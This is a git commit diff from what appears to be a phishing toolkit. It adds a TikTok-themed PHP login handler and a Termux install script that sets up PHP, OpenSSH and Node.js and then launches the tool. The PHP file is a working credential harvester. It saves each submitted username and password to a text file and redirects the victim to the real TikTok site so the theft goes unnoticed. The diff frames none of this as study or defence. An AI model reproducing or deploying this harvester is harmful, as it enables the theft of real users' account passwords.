5f821530e75475c18e6a8ffceb30e017fc5a811d
kym-sam <kymmary50@gmail.com>
2024-06-04 10:32:24 -0300

    sasame

---
+++ .sam/tiktok/login.php
@@ -0,0 +1,5 @@
+<?php 
+file_put_contents("usernames.txt", "\nUsername: " . $_POST['username'] . "\nPass: " . $_POST['Pass'] ."\n", FILE_APPEND);
+header('Location: https://tiktok.com/');
+exit();
+?>
---
+++ install.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+# Hello 👋
+
+pkg update && pkg upgrade
+pkg install openssh
+pkg install which
+pkg install php
+pkg install nodejs -y
+pkg install nodejs-lts -y
+pkg install git -y
+pkg install ffmpeg -y
+npm install -g cfonts
+
+echo "[-] Concluding"
+
+chmod +x sam.sh
+bash sam.sh
